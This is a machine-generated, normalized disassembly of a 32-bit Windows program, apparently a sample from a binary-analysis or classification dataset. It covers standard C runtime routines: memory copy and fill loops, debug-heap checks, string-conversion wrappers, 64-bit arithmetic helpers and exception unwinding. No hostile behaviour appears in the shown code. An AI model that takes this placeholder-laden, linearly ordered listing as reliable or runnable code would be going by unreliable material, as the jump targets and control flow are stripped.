mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_408840 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4089dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408840 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408840 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408840 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4089dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4089dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4089dc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_408a31
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_404f01
pop ecx
sub_408a5a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_404f01
push [ esi + 0x8 ]
call sub_404f01
push [ esi + 0xc ]
call sub_404f01
push [ esi + 0x10 ]
call sub_404f01
push [ esi + 0x14 ]
call sub_404f01
push [ esi + 0x18 ]
call sub_404f01
push [ esi ]
call sub_404f01
push [ esi + 0x20 ]
call sub_404f01
push [ esi + 0x24 ]
call sub_404f01
push [ esi + 0x28 ]
call sub_404f01
push [ esi + 0x2c ]
call sub_404f01
push [ esi + 0x30 ]
call sub_404f01
push [ esi + 0x34 ]
call sub_404f01
push [ esi + 0x1c ]
call sub_404f01
push [ esi + 0x38 ]
call sub_404f01
push [ esi + 0x3c ]
call sub_404f01
add esp 0x40
push [ esi + 0x40 ]
call sub_404f01
push [ esi + 0x44 ]
call sub_404f01
push [ esi + 0x48 ]
call sub_404f01
push [ esi + 0x4c ]
call sub_404f01
push [ esi + 0x50 ]
call sub_404f01
push [ esi + 0x54 ]
call sub_404f01
push [ esi + 0x58 ]
call sub_404f01
push [ esi + 0x5c ]
call sub_404f01
push [ esi + 0x60 ]
call sub_404f01
push [ esi + 0x64 ]
call sub_404f01
push [ esi + 0x68 ]
call sub_404f01
push [ esi + 0x6c ]
call sub_404f01
push [ esi + 0x70 ]
call sub_404f01
push [ esi + 0x74 ]
call sub_404f01
push [ esi + 0x78 ]
call sub_404f01
push [ esi + 0x7c ]
call sub_404f01
add esp 0x40
push [ esi + 0x80 ]
call sub_404f01
push [ esi + 0x84 ]
call sub_404f01
push [ esi + 0x88 ]
call sub_404f01
push [ esi + 0x8c ]
call sub_404f01
push [ esi + 0x90 ]
call sub_404f01
push [ esi + 0x94 ]
call sub_404f01
push [ esi + 0x98 ]
call sub_404f01
push [ esi + 0x9c ]
call sub_404f01
push [ esi + 0xa0 ]
call sub_404f01
push [ esi + 0xa4 ]
call sub_404f01
push [ esi + 0xa8 ]
call sub_404f01
push [ esi + 0xbc ]
call sub_404f01
push [ esi + 0xc0 ]
call sub_404f01
push [ esi + 0xc4 ]
call sub_404f01
push [ esi + 0xc8 ]
call sub_404f01
push [ esi + 0xcc ]
call sub_404f01
add esp 0x40
push [ esi + 0xd0 ]
call sub_404f01
push [ esi + 0xb8 ]
call sub_404f01
push [ esi + 0xd8 ]
call sub_404f01
push [ esi + 0xdc ]
call sub_404f01
push [ esi + 0xe0 ]
call sub_404f01
push [ esi + 0xe4 ]
call sub_404f01
push [ esi + 0xe8 ]
call sub_404f01
push [ esi + 0xec ]
call sub_404f01
push [ esi + 0xd4 ]
call sub_404f01
push [ esi + 0xf0 ]
call sub_404f01
push [ esi + 0xf4 ]
call sub_404f01
push [ esi + 0xf8 ]
call sub_404f01
push [ esi + 0xfc ]
call sub_404f01
push [ esi + 0x100 ]
call sub_404f01
push [ esi + 0x104 ]
call sub_404f01
push [ esi + 0x108 ]
call sub_404f01
add esp 0x40
push [ esi + 0x10c ]
call sub_404f01
push [ esi + 0x110 ]
call sub_404f01
push [ esi + 0x114 ]
call sub_404f01
push [ esi + 0x118 ]
call sub_404f01
push [ esi + 0x11c ]
call sub_404f01
push [ esi + 0x120 ]
call sub_404f01
push [ esi + 0x124 ]
call sub_404f01
push [ esi + 0x128 ]
call sub_404f01
push [ esi + 0x12c ]
call sub_404f01
push [ esi + 0x130 ]
call sub_404f01
push [ esi + 0x134 ]
call sub_404f01
push [ esi + 0x138 ]
call sub_404f01
push [ esi + 0x13c ]
call sub_404f01
push [ esi + 0x140 ]
call sub_404f01
push [ esi + 0x144 ]
call sub_404f01
push [ esi + 0x148 ]
call sub_404f01
add esp 0x40
push [ esi + 0x14c ]
call sub_404f01
push [ esi + 0x150 ]
call sub_404f01
push [ esi + 0x154 ]
call sub_404f01
push [ esi + 0x158 ]
call sub_404f01
push [ esi + 0x15c ]
call sub_404f01
push [ esi + 0x160 ]
call sub_404f01
add esp 0x18
sub_408dd1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
push esi
call sub_404f01
pop ecx
sub_408e3a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404f01
pop ecx
push esi
call sub_404f01
pop ecx
sub_408f38
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4049bd
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_408a31
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_404f7b
pop ecx
cmp eax ebx
je r-xdata
call sub_409530
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_408a31
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_404f7b
pop ecx
cmp eax ebx
je r-xdata
call sub_409530
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_40911f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407f07
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_408f38
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_409165
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4049bd
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_4083b0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_408a31
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_404f7b
pop ecx
cmp eax ebx
je r-xdata
call sub_409530
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40924c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407f07
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_409165
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40928c
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_409350
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4093f0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409410
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4049bd
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_409455
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_409455
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_409410
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_409505
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_409524
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4094fc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_409505
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_409560
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_409590
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4095d0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_409620
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_409660
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4096c8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_409701
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_409755
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a6a3
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40978b
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_4049bd
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_40a6a3
add esp 0x20
pop esi
pop ebp
retn
sub_4097be
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_409895
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
